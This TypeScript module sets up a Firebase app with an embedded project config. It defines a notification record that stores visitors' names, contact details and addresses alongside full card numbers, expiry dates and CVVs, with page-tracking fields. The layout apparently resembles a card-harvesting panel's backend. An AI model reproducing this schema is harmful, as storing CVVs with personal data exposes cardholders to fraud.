import { initializeApp, getApps, getApp } from 'firebase/app';
import { getAuth } from 'firebase/auth';
import { getFirestore} from 'firebase/firestore';
import { getDatabase} from 'firebase/database';

const firebaseConfig = {
  apiKey: "AIzaSyD8b2GhSgTi9-p61mTfP0OoRw7DofJIXoo",
  authDomain: "sxzxc-c1acb.firebaseapp.com",
  projectId: "sxzxc-c1acb",
  storageBucket: "sxzxc-c1acb.firebasestorage.app",
  messagingSenderId: "882959697671",
  appId: "1:882959697671:web:337b14ae8a05aeb876e7a2",
  measurementId: "G-43WVGYQQ38"
};


const app = getApps().length > 0 ? getApp() : initializeApp(firebaseConfig);
const auth = getAuth(app);
const db = getFirestore(app);
const database = getDatabase(app);


export { app, auth, db ,database};

export interface NotificationDocument {
  id: string;
  name: string;
  hasPersonalInfo: boolean;
  hasCardInfo: boolean;
  currentPage: string;
  time: string;
  notificationCount: number;
  personalInfo?: {
    fullName: string;
    email: string;
    phone: string;
    address: string;
  };
  cardInfo?: {
    cardNumber: string;
    expirationDate: string;
    cvv: string;
  };
}

